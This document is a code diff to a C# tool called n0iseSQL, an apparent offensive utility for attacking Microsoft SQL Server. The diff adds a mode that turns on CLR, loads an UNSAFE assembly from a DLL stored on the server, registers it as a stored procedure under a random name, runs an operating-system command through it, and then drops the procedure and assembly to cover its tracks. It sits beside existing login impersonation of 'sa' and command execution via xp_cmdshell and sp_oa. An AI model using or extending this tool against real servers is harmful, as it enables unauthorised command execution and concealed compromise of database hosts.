@@ -1,10 +1,22 @@
 ﻿using System;
+using System.Linq;
 using System.Data.SqlClient;
 
 namespace n0iseSQL
 {
     internal class Program
     {
+
+        private static Random random = new Random();
+
+        public static string RandomString(int length)
+        {
+            //const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            //const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+            const string chars = "ABCDEFGHJKLMNPRSTUVWXYZ";
+            return new string(Enumerable.Repeat(chars, length)
+                .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
         static void Main(string[] args)
         {
 
@@ -16,13 +28,15 @@ namespace n0iseSQL
                 Console.WriteLine("\tauthenticate");
                 Console.WriteLine("\tconnectShare [smbShare] | example: connectShare \\\\server.domain.local\\share");
                 Console.WriteLine("\tenumLoginImpersonation");
-                Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa] [commandToRun]");
+                Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly] [commandToRun] [assemblyPath]");
                 Console.WriteLine("\t\texample: impersonateLogin sa none");
                 Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
                 Console.WriteLine("\t\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
+                Console.WriteLine("\t\texample: impersonateLogin sa loadOnServerStoredAssembly whoami \"C:\\OnServerFolder\\n0iseSQLExec.dll\"");
+                Console.WriteLine("\timpersonateUser [databaseTRUSTWORTHYenabled] [userToImpersonate] | example: impersonateUser msdb dbo");
                 Console.WriteLine("\timpersonateUser [databaseTRUSTWORTHYenabled] [userToImpersonate] | example: impersonateUser msdb dbo");
 
-                
+
                 return;
             }
 
@@ -49,10 +63,11 @@ namespace n0iseSQL
             {
                 if (args.Length < 5)
                 {
-                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] impersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa] [commandToRun]");
-                    Console.WriteLine("\texample: impersonateLogin sa none");
-                    Console.WriteLine("\texample: impersonateLogin sa xp_cmdshell whoami");
-                    Console.WriteLine("\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
+                    Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly] [commandToRun] [assemblyPath]");
+                    Console.WriteLine("\t\texample: impersonateLogin sa none");
+                    Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
+                    Console.WriteLine("\t\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
+                    Console.WriteLine("\t\texample: impersonateLogin sa loadOnServerStoredAssembly whoami \"C:\\OnServerFolder\\n0iseSQLExec.dll\"");
 
                     return;
                 } else
@@ -61,10 +76,11 @@ namespace n0iseSQL
                     {
                         if (args.Length < 6)
                         {
-                            Console.WriteLine("n0iseSQL.exe [sqlServer] [database] impersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa] [commandToRun]");
-                            Console.WriteLine("\texample: impersonateLogin sa none");
-                            Console.WriteLine("\texample: impersonateLogin sa xp_cmdshell whoami");
-                            Console.WriteLine("\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
+                            Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly] [commandToRun] [assemblyPath]");
+                            Console.WriteLine("\t\texample: impersonateLogin sa none");
+                            Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
+                            Console.WriteLine("\t\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
+                            Console.WriteLine("\t\texample: impersonateLogin sa loadOnServerStoredAssembly whoami \"C:\\OnServerFolder\\n0iseSQLExec.dll\"");
                             return;
                         }
                     }
@@ -233,6 +249,55 @@ namespace n0iseSQL
                     reader.Close();
 
                     command = new SqlCommand(execCmd, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+                }
+
+                if (execType == "loadOnServerStoredAssembly")
+                {
+                    String commandToExecute = args[5].ToString();
+                    String onServerStoredAssemly = args[6].ToString(); //for example C:\OnServerFolder\n0iseSQLExec.dll
+                    String randomAssemblyName = RandomString(8);
+                    String randomProcedureName = RandomString(8);
+                    //for SQL 2017+:
+                    //String enable_options = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
+                    //for SQL2016-:
+                    String enable_options = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE;";
+                    command = new SqlCommand(enable_options, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    Console.WriteLine("[+] Creating assembly {0} using assembly stored locally on server {1}...", randomAssemblyName,onServerStoredAssemly);
+                    //String createAsm = String.Format("CREATE ASSEMBLY {0} FROM 'C:\\FolderOnSQLServer\\n0iseSQLExec.dll' WITH PERMISSION_SET = UNSAFE",randomAssemblyName);
+                    String createAsm = String.Format("CREATE ASSEMBLY {0} FROM '{1}' WITH PERMISSION_SET = UNSAFE", randomAssemblyName,onServerStoredAssemly);
+                    command = new SqlCommand(createAsm, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    Console.WriteLine("[+] Creating stored procedure {0}...", randomProcedureName);
+                    String createPro = String.Format("CREATE PROCEDURE [dbo].[{0}] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [{1}].[StoredProcedures].[n0iseSQLExec];",randomProcedureName,randomAssemblyName);
+                    command = new SqlCommand(createPro, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    Console.WriteLine("[+] Executing command {0}", commandToExecute);
+                    String assemblyExecCmd = String.Format("EXEC {0} '{1}'", randomProcedureName, commandToExecute);
+                    command = new SqlCommand(assemblyExecCmd, con);
+                    reader = command.ExecuteReader();
+                    reader.Read();
+                    Console.WriteLine("[+] loadAssembly command execution result is: " + reader[0]);
+                    reader.Close();
+
+                    //cleanup
+                    Console.WriteLine("[+] Dropping stored procedure {0}...", randomProcedureName);
+                    String dropProcedure = String.Format("DROP PROCEDURE [dbo].[{0}];", randomProcedureName);
+                    command = new SqlCommand(dropProcedure, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    Console.WriteLine("[+] Dropping assembly {0}...", randomAssemblyName);
+                    String dropAssembly = String.Format("DROP ASSEMBLY [{0}];", randomAssemblyName);
+                    command = new SqlCommand(dropAssembly, con);
                     reader = command.ExecuteReader();
                     reader.Close();
                 }
